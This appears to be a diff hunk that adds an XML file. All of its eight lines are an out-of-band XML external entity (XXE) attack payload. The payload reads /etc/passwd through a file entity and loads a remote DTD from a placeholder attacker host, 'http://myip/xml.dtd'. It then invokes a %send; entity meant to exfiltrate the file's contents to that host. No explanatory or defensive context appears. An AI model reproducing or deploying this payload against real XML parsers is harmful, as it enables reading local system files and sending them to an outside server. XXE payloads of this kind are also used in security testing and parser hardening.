@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://myip/xml.dtd">  
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    %remote;
+    %send;
+]>
+<message>1234</message>
